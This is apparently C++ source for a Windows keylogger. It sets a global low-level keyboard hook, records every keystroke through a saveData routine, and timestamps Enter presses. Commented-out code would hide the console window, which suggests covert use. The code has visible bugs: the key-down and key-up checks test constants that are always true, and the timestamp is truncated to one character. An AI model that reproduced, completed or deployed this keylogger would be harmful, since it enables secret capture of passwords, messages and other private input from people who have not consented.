#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <bits/stdc++.h>
#include <conio.h>
#include "mainloop.h"
#include "kbd_save.h"
#include "transSpecialKey.h"


// save the string by calling kbd_save saveData function
int save(std::string kbdString){
    Sleep(10); // sleep for 10 milliseconds
    std::cout << "string : " << kbdString << std::endl;
    saveData(std::string(kbdString));

    return 0;
}

// convert virtual key code to string
std::string cnvToString(int vkCode){
    char kbdChar = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
    std::string kbdString = std::string(1, kbdChar);
    return kbdString;
}

// keyboard hook that saves the key pressed
LRESULT CALLBACK KBHook(int nCode, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *KBDLLStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);   

    if(WM_KEYDOWN){
        int vkCode = KBDLLStruct->vkCode;

        isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), vkCode) != std::end(specialKeyArray);

        if(isSpecialKey){ // if the key pressed is a special key
            specialKeyString = translateSpecialKey(vkCode);
            save(specialKeyString);

            if(vkCode == VK_RETURN){
                time_t currentTime = time(&currentTime);
                std::cout << "time : " << currentTime << std::endl;
                save(std::string(1, currentTime));
            }

        } else {
            save(cnvToString(vkCode));
        }
    }
    if(WM_KEYUP){
        
    }

    // passes the hook information to the next hook procedure in the current hook chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void MainLoop::run(){

    //HWND hwnd = GetConsoleWindow();
    //ShowWindow(hwnd, SW_HIDE);

    std::cout << "Hello World!" << std::endl;

    // setup keyboard hook
    HHOOK kbd = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        &KBHook,
        0,
        0
    );

    // message pump thats running a loop
    MSG message;
    while(GetMessage(&message, NULL, 0, 0)){
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(kbd);
}